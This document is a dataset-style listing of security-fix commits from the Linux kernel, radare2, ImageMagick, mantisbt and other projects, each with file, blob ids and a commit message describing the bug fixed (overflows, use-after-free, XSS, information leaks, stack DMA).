    0-T-0_ps4-linux
Commit Message for ee0d8d8482345ff97a75a7d747efc309f13b0d80:
ipx: call ipxitf_put() in ioctl error path\n\nWe should call ipxitf_put() if the copy_to_user() fails.\n\nReported-by: 李强 <liqiang6-s@360.cn> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    06bd3c36a733ac27962fea7d6f47168841376824
File(s) In Commit: 
    fs/ext4/inode.c
Blob(s) In Commit: 
    250c2df04a92c5feee85c6e07c75940dc0af5392
Blob(s) Before Fix: 
    250c2df04a92c5feee85c6e07c75940dc0af5392
Projects:
    0-T-0_ps4-linux
Commit Message for 06bd3c36a733ac27962fea7d6f47168841376824:
ext4: fix data exposure after a crash\n\nHuang has reported that in his powerfail testing he is seeing stale block contents in some of recently allocated blocks although he mounts ext4 in data=ordered mode. After some investigation I have found out that indeed when delayed allocation is used, we don't add inode to transaction's list of inodes needing flushing before commit. Originally we were doing that but commit f3b59291a69d removed the logic with a flawed argument that it is not needed.\n\nThe problem is that although for delayed allocated blocks we write their contents immediately after allocating them, there is no guarantee that the IO scheduler or device doesn't reorder things and thus transaction allocating blocks and attaching them to inode can reach stable storage before actual block contents. Actually whenever we attach freshly allocated blocks to inode using a written extent, we should add inode to transaction's ordered inode list to make sure we properly wait for block contents to be written before committing the transaction. So that is what we do in this patch. This also handles other cases where stale data exposure was possible - like filling hole via mmap in data=ordered,nodelalloc mode.\n\nThe only exception to the above rule are extending direct IO writes where blkdev_direct_IO() waits for IO to complete before increasing i_size and thus stale data exposure is not possible. For now we don't complicate the code with optimizing this special case since the overhead is pretty low. In case this is observed to be a performance problem we can always handle it using a special flag to ext4_map_blocks().\n\nCC: stable@vger.kernel.org Fixes: f3b59291a69d0b734be1fc8be489fef2dd846d3d Reported-by: "HUANG Weller (CM/ESW12-CN)" <Weller.Huang@cn.bosch.com> Tested-by: "HUANG Weller (CM/ESW12-CN)" <Weller.Huang@cn.bosch.com> Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Theodore Ts'o <tytso@mit.edu>

======================================================================
Commit With Fix: 
    8f44c9a41386729fea410e688959ddaa9d51be7c
File(s) In Commit: 
    drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c
Blob(s) In Commit: 
    7e689c86d56576cf96ca755b16107216470fccdf
Blob(s) Before Fix: 
    7e689c86d56576cf96ca755b16107216470fccdf
Projects:
    0-T-0_ps4-linux
Commit Message for 8f44c9a41386729fea410e688959ddaa9d51be7c:
brcmfmac: fix possible buffer overflow in brcmf_cfg80211_mgmt_tx()\n\nThe lower level nl80211 code in cfg80211 ensures that "len" is between 25 and NL80211_ATTR_FRAME (2304).  We subtract DOT11_MGMT_HDR_LEN (24) from "len" so thats's max of 2280.  However, the action_frame->data[] buffer is only BRCMF_FIL_ACTION_FRAME_SIZE (1800) bytes long so this memcpy() can overflow.\n\n	memcpy(action_frame->data, &buf[DOT11_MGMT_HDR_LEN], 	       le16_to_cpu(action_frame->len)) \n\nCc: stable@vger.kernel.org # 3.9.x Fixes: 18e2f61db3b70 ("brcmfmac: P2P action frame tx.") Reported-by: "freenerguo(郭大兴)" <freenerguo@tencent.com> Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6399f1fae4ec29fab5ec76070435555e256ca3a6
File(s) In Commit: 
    net/ipv6/output_core.c
Blob(s) In Commit: 
    abb2c307fbe8337ce1714e7392072c945ed5af51
Blob(s) Before Fix: 
    abb2c307fbe8337ce1714e7392072c945ed5af51
Projects:
    0-T-0_ps4-linux
Commit Message for 6399f1fae4ec29fab5ec76070435555e256ca3a6:
ipv6: avoid overflow of offset in ip6_find_1stfragopt\n\nIn some cases, offset can overflow and can cause an infinite loop in ip6_find_1stfragopt(). Make it unsigned int to prevent the overflow, and cap it at IPV6_MAXPLEN, since packets larger than that should be invalid.\n\nThis problem has been here since before the beginning of git history.\n\nSigned-off-by: Sabrina Dubroca <sd@queasysnail.net> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a69f32175c28af1b34e5df83000f830e60f6bce9
File(s) In Commit: 
    phpmyfaq/inc/PMF/Faq.php
Blob(s) In Commit: 
    1c7ac24d297ea65f8e4f7abaeff38a565fcf90a0
Blob(s) Before Fix: 
    1c7ac24d297ea65f8e4f7abaeff38a565fcf90a0
Projects:
    14wind_phpMyFAQ
Commit Message for a69f32175c28af1b34e5df83000f830e60f6bce9:
Added missing sanitizing

======================================================================
Commit With Fix: 
    60b234301adf258786d8b90be5c1d437fc8799e0
File(s) In Commit: 
    src/flac.c
Blob(s) In Commit: 
    40629c7d69dabf7eb97705107936d95070d6640d
Blob(s) Before Fix: 
    40629c7d69dabf7eb97705107936d95070d6640d
Projects:
    12gjang_libsndfile
Commit Message for 60b234301adf258786d8b90be5c1d437fc8799e0:
src/flac.c: Improve error handling\n\nEspecially when dealing with corrupt or malicious files.

======================================================================
Commit With Fix: 
    cf01fb9985e8deb25ccf0ea54d916b8871ae0e62
File(s) In Commit: 
    mm/mempolicy.c
Blob(s) In Commit: 
    37d0b334bfe9f09222a9626a99b91f4bfca9d784
Blob(s) Before Fix: 
    37d0b334bfe9f09222a9626a99b91f4bfca9d784
Projects:
    0-T-0_ps4-linux
Commit Message for cf01fb9985e8deb25ccf0ea54d916b8871ae0e62:
mm/mempolicy.c: fix error handling in set_mempolicy and mbind.\n\nIn the case that compat_get_bitmap fails we do not want to copy the bitmap to the user as it will contain uninitialized stack data and leak sensitive data.\n\nSigned-off-by: Chris Salls <salls@cs.ucsb.edu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e6838a29ecb484c97e4efef9429643b9851fba6e
File(s) In Commit: 
    fs/nfsd/nfssvc.c
Blob(s) In Commit: 
    59979f0bbd4bf255f5ea6f8fbd33cb9b2a5aa073
Blob(s) Before Fix: 
    59979f0bbd4bf255f5ea6f8fbd33cb9b2a5aa073
Projects:
    0-T-0_ps4-linux
Commit Message for e6838a29ecb484c97e4efef9429643b9851fba6e:
nfsd: check for oversized NFSv2/v3 arguments\n\nA client can append random data to the end of an NFSv2 or NFSv3 RPC call without our complaining  we'll just stop parsing at the end of the expected data and ignore the rest.\n\nEncoded arguments and replies are stored together in an array of pages, and if a call is too large it could leave inadequate space for the reply.  This is normally OK because NFS RPC's typically have either short arguments and long replies (like READ) or long arguments and short replies (like WRITE).  But a client that sends an incorrectly long reply can violate those assumptions.  This was observed to cause crashes.\n\nAlso, several operations increment rq_next_page in the decode routine before checking the argument size, which can leave rq_next_page pointing well past the end of the page array, causing trouble later in svc_free_pages.\n\nSo, following a suggestion from Neil Brown, add a central check to enforce our expectation that no NFSv2/v3 call has both a large call and a large reply.\n\nAs followup we may also want to rewrite the encoding routines to check more carefully that they aren't running off the end of the page array.\n\nWe may also consider rejecting calls that have any extra garbage appended.  That would be safer, and within our rights by spec, but given the age of our server and the NFS protocol, and the fact that we've never enforced this before, we may need to balance that against the possibility of breaking some oddball client.\n\nReported-by: Tuomas Haanpää <thaan@synopsys.com> Reported-by: Ari Kauppi <ari@synopsys.com> Cc: stable@vger.kernel.org Reviewed-by: NeilBrown <neilb@suse.com> Signed-off-by: J. Bruce Fields <bfields@redhat.com>

======================================================================
Commit With Fix: 
    d2632f6483a3ceb5d8e0a5fb11142c51c43978b4
File(s) In Commit: 
    libr/bin/format/wasm/wasm.c
Blob(s) In Commit: 
    4df4802ed2dbd8a0e7d39b4e58a2a9e2cf74dc16
Blob(s) Before Fix: 
    4df4802ed2dbd8a0e7d39b4e58a2a9e2cf74dc16
Projects:
    0-T-0_radare2
Commit Message for d2632f6483a3ceb5d8e0a5fb11142c51c43978b4:
Fix crash in fuzzed wasm r2_hoobr_consume_init_expr

======================================================================
Commit With Fix: 
    f7a547b7ef8fc8ebdeaa4c28515c9d72e592fb6d
File(s) In Commit: 
    src/wallpaper.c
Blob(s) In Commit: 
    93994b3d6a9f34cea681de98192119e35faa661e
Blob(s) Before Fix: 
    93994b3d6a9f34cea681de98192119e35faa661e
Projects:
    0ion9_feh
Commit Message for f7a547b7ef8fc8ebdeaa4c28515c9d72e592fb6d:
Fix double-free/OOB-write while receiving IPC data\n\nIf a malicious client pretends to be the E17 window manager, it is possible to trigger an out of boundary heap write while receiving an IPC message.\n\nThe length of the already received message is stored in an unsigned short, which overflows after receiving 64 KB of data. It's comparably small amount of data and therefore achievable for an attacker.\n\nWhen len overflows, realloc() will either be called with a small value and therefore chars will be appended out of bounds, or len + 1 will be exactly 0, in which case realloc() behaves like free(). This could be abused for a later double-free attack as it's even possible to overwrite the free information -- but this depends on the malloc implementation.\n\nSigned-off-by: Tobias Stoeckmann <tobias@stoeckmann.org>

======================================================================
Commit With Fix: 
    a1c719313d61b07bbe8700005807b8195fdc32f1
File(s) In Commit: 
    core/timeline_inc.php
Blob(s) In Commit: 
    952711677d189a9262d1c722b458a5e78640b12c
Blob(s) Before Fix: 
    952711677d189a9262d1c722b458a5e78640b12c
Projects:
    01-Scripts_mantisbt
Commit Message for a1c719313d61b07bbe8700005807b8195fdc32f1:
Fix XSS in timeline_inc.php\n\nUse of $_SERVER['PHP_SELF'] and outputting it as-is allows an attacker to inject arbitrary JavaScript as part of the URL.\n\nUsing SCRIPT_NAME and passing it through string_sanitize_url() instead prevents the attack.\n\nFixes #22742 Fixes https://github.com/mantisbt/mantisbt/pull/1094

======================================================================
Commit With Fix: 
    d1e8ac62c6d978d4662f69116e30230d43033c92
File(s) In Commit: 
    libr/bin/format/mach0/mach0.c
Blob(s) In Commit: 
    398a44b15289f997c25c6e7d9c2dd50129bb62e4
Blob(s) Before Fix: 
    398a44b15289f997c25c6e7d9c2dd50129bb62e4
Projects:
    0-T-0_radare2
Commit Message for d1e8ac62c6d978d4662f69116e30230d43033c92:
Fix null deref and uaf in mach0 parser

======================================================================
Commit With Fix: 
    67b0503db9c29b04eadfeede6bebbfe5ddad94ef
File(s) In Commit: 
    drivers/media/usb/dvb-usb/dvb-usb-firmware.c
Blob(s) In Commit: 
    04033efe7ad5394d4fd9493ce6b790de1404666b
Blob(s) Before Fix: 
    04033efe7ad5394d4fd9493ce6b790de1404666b
Projects:
    0-T-0_ps4-linux
Commit Message for 67b0503db9c29b04eadfeede6bebbfe5ddad94ef:
[media] dvb-usb-firmware: don't do DMA on stack\n\nThe buffer allocation for the firmware data was changed in commit 43fab9793c1f ("[media] dvb-usb: don't use stack for firmware load") but the same applies for the reset value.\n\nFixes: 43fab9793c1f ("[media] dvb-usb: don't use stack for firmware load") Cc: stable@vger.kernel.org Signed-off-by: Stefan Brüns <stefan.bruens@rwth-aachen.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    606142af57dad981b78707234cfbd15f9f7b7125
File(s) In Commit: 
    drivers/media/usb/dvb-usb/dw2102.c
Blob(s) In Commit: 
    4f42d57f81d9541d25f02af65086f6465af90728
Blob(s) Before Fix: 
    4f42d57f81d9541d25f02af65086f6465af90728
Projects:
    0-T-0_ps4-linux
Commit Message for 606142af57dad981b78707234cfbd15f9f7b7125:
[media] dw2102: don't do DMA on stack\n\nOn Kernel 4.9, WARNINGs about doing DMA on stack are hit at the dw2102 driver: one in su3000_power_ctrl() and the other in tt_s2_4600_frontend_attach().\n\nBoth were due to the use of buffers on the stack as parameters to dvb_usb_generic_rw() and the resulting attempt to do DMA with them.\n\nThe device was non-functional as a result.\n\nSo, switch this driver over to use a buffer within the device state structure, as has been done with other DVB-USB drivers.\n\nTested with TechnoTrend TT-connect S2-4600.\n\n[mchehab@osg.samsung.com: fixed a warning at su3000_i2c_transfer() that  state var were dereferenced before check 'd'] Signed-off-by: Jonathan McDowell <noodles@earth.li> Cc: <stable@vger.kernel.org> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    3f190e3aec212fc8c61e202c51400afa7384d4bc
File(s) In Commit: 
    drivers/media/usb/dvb-usb/cxusb.c
Blob(s) In Commit: 
    51620e02292f588b6643862c3207aa6d5cd75948
Blob(s) Before Fix: 
    51620e02292f588b6643862c3207aa6d5cd75948
Projects:
    0-T-0_ps4-linux
Commit Message for 3f190e3aec212fc8c61e202c51400afa7384d4bc:
[media] cxusb: Use a dma capable buffer also for reading\n\nCommit 17ce039b4e54 ("[media] cxusb: don't do DMA on stack") added a kmalloc'ed bounce buffer for writes, but missed to do the same for reads. As the read only happens after the write is finished, we can reuse the same buffer.\n\nAs dvb_usb_generic_rw handles a read length of 0 by itself, avoid calling it using the dvb_usb_generic_read wrapper function.\n\nSigned-off-by: Stefan Brüns <stefan.bruens@rwth-aachen.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    005145378c9ad7575a01b6ce1ba118fb427f583a
File(s) In Commit: 
    drivers/media/usb/dvb-usb-v2/dvb_usb_core.c
Blob(s) In Commit: 
    955fb0d075070a2ee62b0afa698268049fd90f09
Blob(s) Before Fix: 
    955fb0d075070a2ee62b0afa698268049fd90f09
Projects:
    0-T-0_ps4-linux
Commit Message for 005145378c9ad7575a01b6ce1ba118fb427f583a:
[media] dvb-usb-v2: avoid use-after-free\n\nI ran into a stack frame size warning because of the on-stack copy of the USB device structure:\n\ndrivers/media/usb/dvb-usb-v2/dvb_usb_core.c: In function 'dvb_usbv2_disconnect': drivers/media/usb/dvb-usb-v2/dvb_usb_core.c:1029:1: error: the frame size of 1104 bytes is larger than 1024 bytes [-Werror=frame-larger-than=]\n\nCopying a device structure like this is wrong for a number of other reasons too aside from the possible stack overflow. One of them is that the dev_info() call will print the name of the device later, but AFAICT we have only copied a pointer to the name earlier and the actual name has been freed by the time it gets printed.\n\nThis removes the on-stack copy of the device and instead copies the device name using kstrdup(). I'm ignoring the possible failure here as both printk() and kfree() are able to deal with NULL pointers.\n\nSigned-off-by: Arnd Bergmann <arnd@arndb.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    3b30460c5b0ed762be75a004e924ec3f8711e032
File(s) In Commit: 
    crypto/ccm.c
Blob(s) In Commit: 
    1ce37ae0ce565a130962f50244f331117fe965d8
Blob(s) Before Fix: 
    1ce37ae0ce565a130962f50244f331117fe965d8
Projects:
    0-T-0_ps4-linux
Commit Message for 3b30460c5b0ed762be75a004e924ec3f8711e032:
crypto: ccm - move cbcmac input off the stack\n\nCommit f15f05b0a5de ("crypto: ccm - switch to separate cbcmac driver") refactored the CCM driver to allow separate implementations of the underlying MAC to be provided by a platform. However, in doing so, it moved some data from the linear region to the stack, which violates the SG constraints when the stack is virtually mapped.\n\nSo move idata/odata back to the request ctx struct, of which we can reasonably expect that it has been allocated using kmalloc() et al.\n\nReported-by: Johannes Berg <johannes@sipsolutions.net> Fixes: f15f05b0a5de ("crypto: ccm - switch to separate cbcmac driver") Signed-off-by: Ard Biesheuvel <ard.biesheuvel@linaro.org> Tested-by: Johannes Berg <johannes@sipsolutions.net> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    c919a3069c775c1c876bec55e00b2305d5125caa
File(s) In Commit: 
    drivers/net/can/usb/gs_usb.c
Blob(s) In Commit: 
    a0dabd4038ba350c6b26f2a53834cb342c17da46
Blob(s) Before Fix: 
    a0dabd4038ba350c6b26f2a53834cb342c17da46
Projects:
    0-T-0_ps4-linux
Commit Message for c919a3069c775c1c876bec55e00b2305d5125caa:
can: gs_usb: Don't use stack memory for USB transfers\n\nFixes: 05ca5270005c can: gs_usb: add ethtool set_phys_id callback to locate physical device\n\nThe gs_usb driver is performing USB transfers using buffers allocated on the stack. This causes the driver to not function with vmapped stacks. Instead, allocate memory for the transfer buffers.\n\nSigned-off-by: Ethan Zonca <e@ethanzonca.com> Cc: linux-stable <stable@vger.kernel.org> # >= v4.8 Signed-off-by: Marc Kleine-Budde <mkl@pengutronix.de>

======================================================================
Commit With Fix: 
    c4baad50297d84bde1a7ad45e50c73adae4a2192
File(s) In Commit: 
    drivers/char/virtio_console.c
Blob(s) In Commit: 
    e9b7e0b3cabe60d3be3ab8a092159b137854d8ec
Blob(s) Before Fix: 
    e9b7e0b3cabe60d3be3ab8a092159b137854d8ec
Projects:
    0-T-0_ps4-linux
Commit Message for c4baad50297d84bde1a7ad45e50c73adae4a2192:
virtio-console: avoid DMA from stack\n\nput_chars() stuffs the buffer it gets into an sg, but that buffer may be on the stack. This breaks with CONFIG_VMAP_STACK=y (for me, it manifested as printks getting turned into NUL bytes).\n\nSigned-off-by: Omar Sandoval <osandov@fb.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Reviewed-by: Amit Shah <amit.shah@redhat.com>

======================================================================
Commit With Fix: 
    5593523f968bc86d42a035c6df47d5e0979b5ace
File(s) In Commit: 
    drivers/net/usb/pegasus.c
Blob(s) In Commit: 
    36674484c6fb9b73011619824f7bc60c50b9c1ad
Blob(s) Before Fix: 
    36674484c6fb9b73011619824f7bc60c50b9c1ad
Projects:
    0-T-0_ps4-linux
Commit Message for 5593523f968bc86d42a035c6df47d5e0979b5ace:
pegasus: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") References: https://bugs.debian.org/852556 Reported-by: Lisandro Damián Nicanor Pérez Meyer <lisandro@debian.org> Tested-by: Lisandro Damián Nicanor Pérez Meyer <lisandro@debian.org> Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7926aff5c57b577ab0f43364ff0c59d968f6a414
File(s) In Commit: 
    drivers/net/usb/rtl8150.c
Blob(s) In Commit: 
    c81c79110cefca9443d614679d8e7cdd4b3295c3
Blob(s) Before Fix: 
    c81c79110cefca9443d614679d8e7cdd4b3295c3
Projects:
    0-T-0_ps4-linux
Commit Message for 7926aff5c57b577ab0f43364ff0c59d968f6a414:
rtl8150: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2d6a0e9de03ee658a9adc3bfb2f0ca55dff1e478
File(s) In Commit: 
    drivers/net/usb/catc.c
Blob(s) In Commit: 
    0acc9b640419a2e94bc9a2d3d43a5a2a65800c8b
Blob(s) Before Fix: 
    0acc9b640419a2e94bc9a2d3d43a5a2a65800c8b
Projects:
    0-T-0_ps4-linux
Commit Message for 2d6a0e9de03ee658a9adc3bfb2f0ca55dff1e478:
catc: Use heap buffer for memory size test\n\nAllocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7a7b5df84b6b4e5d599c7289526eed96541a0654
File(s) In Commit: 
    drivers/hid/hid-cp2112.c
Blob(s) In Commit: 
    3e0b6bad29f200fbd314c12077ff7180e9d63c03
Blob(s) Before Fix: 
    3e0b6bad29f200fbd314c12077ff7180e9d63c03
Projects:
    0-T-0_ps4-linux
Commit Message for 7a7b5df84b6b4e5d599c7289526eed96541a0654:
HID: cp2112: fix sleep-while-atomic\n\nA recent commit fixing DMA-buffers on stack added a shared transfer buffer protected by a spinlock. This is broken as the USB HID request callbacks can sleep. Fix this up by replacing the spinlock with a mutex.\n\nFixes: 1ffb3c40ffb5 ("HID: cp2112: make transfer buffers DMA capable") Cc: stable <stable@vger.kernel.org>	# 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    8e9faa15469ed7c7467423db4c62aeed3ff4cae3
File(s) In Commit: 
    drivers/hid/hid-cp2112.c
Blob(s) In Commit: 
    b22d0f83f8e38a9ee0d0eb7381e95d6b90442b61
Blob(s) Before Fix: 
    b22d0f83f8e38a9ee0d0eb7381e95d6b90442b61
Projects:
    0-T-0_ps4-linux
Commit Message for 8e9faa15469ed7c7467423db4c62aeed3ff4cae3:
HID: cp2112: fix gpio-callback error handling\n\nIn case of a zero-length report, the gpio direction_input callback would currently return success instead of an errno.\n\nFixes: 1ffb3c40ffb5 ("HID: cp2112: make transfer buffers DMA capable") Cc: stable <stable@vger.kernel.org>     # 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    2fb346f25f79e412cf0ed314fdf791763c19b70b
File(s) In Commit: 
    src/plugins/irc/irc-ctcp.c
Blob(s) In Commit: 
    8afee681c86946a1530da1ad7b0c6dfae1c41b5e
Blob(s) Before Fix: 
    8afee681c86946a1530da1ad7b0c6dfae1c41b5e
Projects:
    07101994_KISS
Commit Message for 2fb346f25f79e412cf0ed314fdf791763c19b70b:
irc: fix parsing of DCC filename

======================================================================
Commit With Fix: 
    0b2241ff1c7d86376fa260c5d4c1714f6cef9c0f
File(s) In Commit: 
    framework/modules/file/connector/elfinder.php
Blob(s) In Commit: 
    4ad6f4abc66bc43841029082c728c06ad79ef5a9
Blob(s) Before Fix: 
    4ad6f4abc66bc43841029082c728c06ad79ef5a9
Projects:
    nwtn_exponent-cms
Commit Message for 0b2241ff1c7d86376fa260c5d4c1714f6cef9c0f:
fix possible xss security issue with elFinder (thanks to chengable)

======================================================================
Commit With Fix: 
    ff425d1db7082e2755d2a405af53861552acf2a1
File(s) In Commit: 
    js/ui/extensionSystem.js
Blob(s) In Commit: 
    fc352b895add637c0797efd02f8e392847db9d80
Blob(s) Before Fix: 
    fc352b895add637c0797efd02f8e392847db9d80
Projects:
    3v1n0_gnome-shell
Commit Message for ff425d1db7082e2755d2a405af53861552acf2a1:
extensionSystem: handle reloading broken extensions\n\nSome extensions out there may fail to reload. When that happens, we need to catch any exceptions so that we don't leave things in a broken state that could lead to leaving extensions enabled in the screen shield.\n\nhttps://bugzilla.gnome.org/show_bug.cgi?id=781728

======================================================================
Commit With Fix: 
    de52e7ee61a842d8fdf791f2a5b7c91b6c5cdb56
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    7532d560d56b42844b1167b809a983e018e88394
Blob(s) Before Fix: 
    7532d560d56b42844b1167b809a983e018e88394
Projects:
    sqlinda_gas
Commit Message for de52e7ee61a842d8fdf791f2a5b7c91b6c5cdb56:
quick fix to security issue

======================================================================
Commit With Fix: 
    176f8a075a963ffbfa56f1c460c15f6a1a6af5a7
File(s) In Commit: 
    bin/varnishd/cache/cache_fetch.c
Blob(s) In Commit: 
    883964239c18b0724f43c24dd1776ba39dcca0fb
Blob(s) Before Fix: 
    883964239c18b0724f43c24dd1776ba39dcca0fb
Projects:
    10corp_Varnish-Cache
Commit Message for 176f8a075a963ffbfa56f1c460c15f6a1a6af5a7:
Avoid buffer read overflow on vcl_error and -sfile\n\nThe file stevedore may return a buffer larger than asked for when requesting storage. Due to lack of check for this condition, the code to copy the synthetic error memory buffer from vcl_error would overrun the buffer.\n\nPatch by @shamger\n\nFixes: #2429

======================================================================
Commit With Fix: 
    1fe8fbc032ccda1db9af66d93016b49c16c1f22d
File(s) In Commit: 
    src/low-level/imf/mailimf.c
Blob(s) In Commit: 
    b557070d2ca3f804686cb57f9f90775112a6ff74
Blob(s) Before Fix: 
    b557070d2ca3f804686cb57f9f90775112a6ff74
Projects:
    AaronZhangL_libetpan
Commit Message for 1fe8fbc032ccda1db9af66d93016b49c16c1f22d:
Fixed crash #274

======================================================================
Commit With Fix: 
    354dd3924a2e43806774953de536257548b5002c
File(s) In Commit: 
    drivers/media/pci/saa7164/saa7164-bus.c
Blob(s) In Commit: 
    ecfeac5cdbedc45416ef87d660d3af298756b912
Blob(s) Before Fix: 
    ecfeac5cdbedc45416ef87d660d3af298756b912
Projects:
    0-T-0_ps4-linux
Commit Message for 354dd3924a2e43806774953de536257548b5002c:
[PATCH] saa7164: Bug - Double fetch PCIe access condition\n\nAvoid a double fetch by reusing the values from the prior transfer.\n\nOriginally reported via https://bugzilla.kernel.org/show_bug.cgi?id=195559\n\nThanks to Pengfei Wang <wpengfeinudt@gmail.com> for reporting.\n\nSigned-off-by: Steven Toth <stoth@kernellabs.com>

======================================================================
Commit With Fix: 
    657831ffc38e30092a2d5f03d385d710eb88b09a
File(s) In Commit: 
    net/ipv4/inet_connection_sock.c
Blob(s) In Commit: 
    1054d330bf9df3189a21dbb08e27c0e6ad136775
Blob(s) Before Fix: 
    1054d330bf9df3189a21dbb08e27c0e6ad136775
Projects:
    0-T-0_ps4-linux
Commit Message for 657831ffc38e30092a2d5f03d385d710eb88b09a:
dccp/tcp: do not inherit mc_list from parent\n\nsyzkaller found a way to trigger double frees from ip_mc_drop_socket()\n\nIt turns out that leave a copy of parent mc_list at accept() time, which is very bad.\n\nVery similar to commit 8b485ce69876 ("tcp: do not inherit fastopen_req from parent")\n\nInitial report from Pray3r, completed by Andrey one. Thanks a lot to them !\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Pray3r <pray3r.z@gmail.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    46dd48442204207b52c16065ad67d294194afd8d
File(s) In Commit: 
    irc.cgi
Blob(s) In Commit: 
    75844a336bb443c306141b740db52c72db604bdf
Blob(s) Before Fix: 
    75844a336bb443c306141b740db52c72db604bdf
Projects:
    dgl_cgiirc
Commit Message for 46dd48442204207b52c16065ad67d294194afd8d:
Validate R parameter in irc.cgi\n\nThis matches the check done in nph-irc.cgi.

======================================================================
Commit With Fix: 
    654b404f2a222f918af9b0cd18ad469d0c941a8e
File(s) In Commit: 
    drivers/usb/serial/io_ti.c
Blob(s) In Commit: 
    a76b95d32157871f5e2964b629784a7642da8480
Blob(s) Before Fix: 
    a76b95d32157871f5e2964b629784a7642da8480
Projects:
    0-T-0_ps4-linux
Commit Message for 654b404f2a222f918af9b0cd18ad469d0c941a8e:
USB: serial: io_ti: fix information leak in completion handler\n\nAdd missing sanity check to the bulk-in completion handler to avoid an integer underflow that can be triggered by a malicious device.\n\nThis avoids leaking 128 kB of memory content from after the URB transfer buffer to user space.\n\nFixes: 8c209e6782ca ("USB: make actual_length in struct urb field u32") Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Cc: stable <stable@vger.kernel.org>	# 2.6.30 Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    30572418b445d85fcfe6c8fe84c947d2606767d8
File(s) In Commit: 
    drivers/usb/serial/omninet.c
Blob(s) In Commit: 
    76564b3bebb9bc3b1c6c2ec5761b74b2bcefcd1e
Blob(s) Before Fix: 
    76564b3bebb9bc3b1c6c2ec5761b74b2bcefcd1e
Projects:
    0-T-0_ps4-linux
Commit Message for 30572418b445d85fcfe6c8fe84c947d2606767d8:
USB: serial: omninet: fix reference leaks at open\n\nThis driver needlessly took another reference to the tty on open, a reference which was then never released on close. This lead to not just a leak of the tty, but also a driver reference leak that prevented the driver from being unloaded after a port had once been opened.\n\nFixes: 4a90f09b20f4 ("tty: usb-serial krefs") Cc: stable <stable@vger.kernel.org>	# 2.6.28 Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    fdcee2cbb8438702ea1b328fb6e0ac5e9a40c7f8
File(s) In Commit: 
    net/sctp/ipv6.c
Blob(s) In Commit: 
    f5b45b8b8b16e6965d24cd79b150828a608c2121
Blob(s) Before Fix: 
    f5b45b8b8b16e6965d24cd79b150828a608c2121
Projects:
    0-T-0_ps4-linux
Commit Message for fdcee2cbb8438702ea1b328fb6e0ac5e9a40c7f8:
sctp: do not inherit ipv6_{mc|ac|fl}_list from parent\n\nSCTP needs fixes similar to 83eaddab4378 ("ipv6/dccp: do not inherit ipv6_mc_list from parent"), otherwise bad things can happen.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0c5b1e430a83ef793a7334bbbee408cf3c628699
File(s) In Commit: 
    coders/dds.c
Blob(s) In Commit: 
    f1b1d8c71514f460be946871a1d16820986d0c55
Blob(s) Before Fix: 
    f1b1d8c71514f460be946871a1d16820986d0c55
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 0c5b1e430a83ef793a7334bbbee408cf3c628699:
Added check to prevent image being 0x0 (reported in #489).

======================================================================
Commit With Fix: 
    f0232a2a45dfd003c1faf6079497895df3ab0ee1
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    cfd68440066328997e1a11b3ff2ad178dbc748bc
Blob(s) Before Fix: 
    cfd68440066328997e1a11b3ff2ad178dbc748bc
Projects:
    2016repotsheyue_ImageMagick
Commit Message for f0232a2a45dfd003c1faf6079497895df3ab0ee1:
Fixed incorrect call to WriteBlob reported in #490.

======================================================================
